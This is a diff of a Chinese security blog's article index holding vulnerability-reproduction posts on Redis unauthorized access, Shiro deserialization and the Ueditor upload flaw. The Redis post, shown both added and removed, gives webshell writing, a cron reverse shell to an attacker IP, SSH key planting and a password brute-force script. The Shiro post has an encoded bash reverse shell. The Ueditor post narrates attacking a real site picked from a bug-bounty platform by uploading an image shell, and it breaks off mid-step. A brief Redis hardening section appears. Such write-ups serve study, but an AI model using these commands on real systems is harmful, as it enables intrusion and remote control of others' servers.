+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
+<p>密码登录</p>
+<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>
+
+<p>以上，开始编写Python脚本</p>
+<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
+
+<p>结果：</p>
+<p>空密码：</p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
+<p>设置密码</p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>修改脚本，链接：</p>
+<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
+<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
+<p>缺点：多点登陆失效。</p>
+<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Shiro</tag>
+        <tag>Redis</tag>
       </tags>
   </entry>
   <entry>
@@ -4993,116 +5084,25 @@
       </tags>
   </entry>
   <entry>
-    <title>Redis未授权访问漏洞复现</title>
-    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
-<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
-<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
-<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
 
-<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
-<p>靶机：Ubuntu20 + Redis2.8.17</p>
-<p>1、下载环境</p>
-<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
 
-<p>2、解压并进入安装目录</p>
-<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
 
-<p>报错：</p>
-<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>
-
-<p>解决：安装gcc</p>
-<pre class="highlight"><span class="line">apt install gcc</span><br></pre>
-
-<p>清理编译文件，重新编译</p>
-<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>
-
-<p>3、</p>
-<p>拷贝关键文件</p>
-<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>
-
-<p>4、启动</p>
-<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>
-
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
-<p>登陆成功</p>
-<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
-<p>因为没有搭建网站环境，这里写在用户根目录</p>
-<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
-<p>靶机成功写入</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
-<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
-<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
-<p>注意！</p>
-<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
-<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>
-
-<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
-<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
-<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>
-
-<p>解决以上坑点，成功反弹shell</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
-<p>但是这样意义不大，据说centos无以上坑点。</p>
-<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
-<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>
-
-<p>2、设置redis变量</p>
-<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>
-
-<p>3、连接redis并写入</p>
-<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>
-
-<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
-<p>5、攻击机进行ssh连接</p>
-<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
-<p>连接成功</p>
-<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
-<p>附Ubuntu安装ssh</p>
-<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>
-
-<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
-<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
-<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>
-
-<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
-<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
-<p>准备：</p>
-<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
-<p>密码登录</p>
-<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>
-
-<p>以上，开始编写Python脚本</p>
-<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
-
-<p>结果：</p>
-<p>空密码：</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
-<p>设置密码</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
-<p>————————————————————————————————————————————————————————————</p>
-<p>修改脚本，链接：</p>
-<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
-<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
-<p>缺点：多点登陆失效。</p>
-<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Redis</tag>
+        <tag>Shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -5199,6 +5199,53 @@
       </tags>
   </entry>
   <entry>
+    <title>Ueditor漏洞复现</title>
+    <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" alt="image-20210730085813949" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" class="lozad post-image"></p>
+<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>1、发现存在ueditor文本编辑器</p>
+<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" alt="image-20210810151403335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" class="lozad post-image"></p>
+<p>2、漏洞探测</p>
+<p>访问url</p>
+<pre class="highlight"><span class="line">/usditor/net/controller.ashx?action=catchimage</span><br></pre>
+
+<p>返回</p>
+<pre class="highlight"><span class="line">&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;</span><br></pre>
+
+<p>说明存在编辑器文件上传漏洞。</p>
+<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" alt="image-20210730090222390" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" class="lozad post-image"></p>
+<p>3、构造上传入口</p>
+<pre class="highlight"><span class="line">&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
+
+<p>注：action的通用地址应为：</p>
+<pre class="highlight"><span class="line">http://xxx.com/ueditor/net/controller.ashx?action=catchimage</span><br></pre>
+
+<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" alt="image-20210810151430644" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" class="lozad post-image"></p>
+<p>4、上传公网服务器aspx图片马，并用<code>?.aspx</code>连接，即<code>http://x/x.jpg?.aspx</code></p>
